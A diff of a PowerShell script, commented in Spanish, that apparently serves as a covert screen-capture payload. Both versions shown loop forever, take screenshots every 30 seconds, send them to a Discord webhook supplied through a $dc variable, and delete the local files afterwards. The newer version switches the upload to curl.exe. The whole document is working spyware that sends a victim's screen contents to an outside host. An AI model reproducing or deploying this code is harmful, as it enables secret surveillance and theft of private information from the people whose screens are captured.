@@ -1,41 +1,33 @@
-# Función para tomar una captura de pantalla y enviarla al webhook
-function Send-ScreenshotToDiscord {
-    # Definir la URL del webhook de Discord
-    $webhookUrl = "$dc"
-
-    # Definir el nombre del archivo de la captura de pantalla con fecha y hora
-    $fileName = "$env:TEMP\SC_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
-    
-    # Tomar la captura de pantalla
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -AssemblyName System.Drawing
-    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
-    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
-    
-    # Guardar la captura de pantalla en un archivo
-    $bitmap.Save($fileName, [System.Drawing.Imaging.ImageFormat]::Png)
-    
-    # Formatear la fecha y hora actual
-    $dateTime = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
-    
-    # Enviar la captura de pantalla al webhook de Discord con la fecha y hora
-    $file = [System.IO.File]::ReadAllBytes($fileName)
-    $base64File = [Convert]::ToBase64String($file)
-    $data = @{
-        content = "Screenshot at $dateTime:"
-        file = "data:image/png;base64,$base64File"
-    } | ConvertTo-Json
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $data
-    
-    # Eliminar el archivo de la captura de pantalla
-    Remove-Item -Path $fileName
-}
+# Definir la URL del webhook de Discord
+$webhookUrl = "$dc"
 
 # Bucle principal: tomar dos capturas de pantalla cada 30 segundos
 While ($true) {
-    Send-ScreenshotToDiscord
-    Send-ScreenshotToDiscord
+    # Tomar la primera captura de pantalla
+    $firstScreenshot = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
+    $firstGraphic = [System.Drawing.Graphics]::FromImage($firstScreenshot)
+    $firstGraphic.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size)
+    
+    # Guardar la primera captura de pantalla en un archivo temporal
+    $firstFilePath = "$env:TEMP\SC1.png"
+    $firstScreenshot.Save($firstFilePath, [System.Drawing.Imaging.ImageFormat]::Png)
+    
+    # Tomar la segunda captura de pantalla
+    $secondScreenshot = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
+    $secondGraphic = [System.Drawing.Graphics]::FromImage($secondScreenshot)
+    $secondGraphic.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size)
+    
+    # Guardar la segunda captura de pantalla en un archivo temporal
+    $secondFilePath = "$env:TEMP\SC2.png"
+    $secondScreenshot.Save($secondFilePath, [System.Drawing.Imaging.ImageFormat]::Png)
+    
+    # Enviar ambas capturas de pantalla al webhook de Discord
+    curl.exe -F "file1=@$firstFilePath" -F "file2=@$secondFilePath" $webhookUrl
+    
+    # Eliminar los archivos temporales
+    Remove-Item -Path $firstFilePath
+    Remove-Item -Path $secondFilePath
+    
+    # Esperar 30 segundos antes de tomar la próxima captura
     Start-Sleep -Seconds 30
 }
